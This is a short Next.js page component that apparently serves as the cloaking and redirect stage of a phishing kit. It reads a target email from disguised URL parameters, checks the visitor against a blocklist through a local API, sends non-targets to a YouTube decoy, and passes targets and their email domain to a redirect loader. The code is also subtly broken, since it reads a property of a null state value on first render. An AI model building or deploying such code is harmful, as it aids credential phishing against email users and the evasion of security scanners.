"use client"
import Image from "next/image";
import NotFound from "@/components/NotFound";
import Loader from "@/components/Loader"
import { useEffect, useState } from "react";

export default function Home() {
  const [redirect, setRedirect] = useState(false)
  const [geoInfo, setGeoInfo] = useState(null)
  const [dm, setDm] = useState(null)

  useEffect(() => {

   const mySearchParams = new URLSearchParams(window.location.search)
   const key = mySearchParams.get('jsv')
   const sid = mySearchParams.get('sid')
   const email = mySearchParams.get('emz')

   if(isValidEmail(email)) {
    let domain = email && email.split('@')[1]
    getGeoInfo(key, sid, "0")
    setDm(domain)
   } else {
    getGeoInfo(key, sid, "1")
    setTimeout(() => {
       window.location = `https://www.youtube.com/watch?v=MvyimScoS2M`
    }, 2000)

   }



  }, [])

  function isValidEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  }



  async function getGeoInfo(key, sid,cnd) {
    const response = await fetch(`/api/getInfo/?cnd=${cnd}&kyi=${key}&sid=${sid}`)
    const data = await response.json()
    if(data.isBlklisted) {

      setRedirect(false)

    } else {
      setRedirect(true)
    }

    setGeoInfo(data)

  }
  return (
    <>
    <Loader redirectUrl={geoInfo.skt} redirect={redirect} domain={dm} />
    {/* {!redirect ? <NotFound /> : <Loader redirect={geoInfo.skt} /> } */}

    </>
  );
}
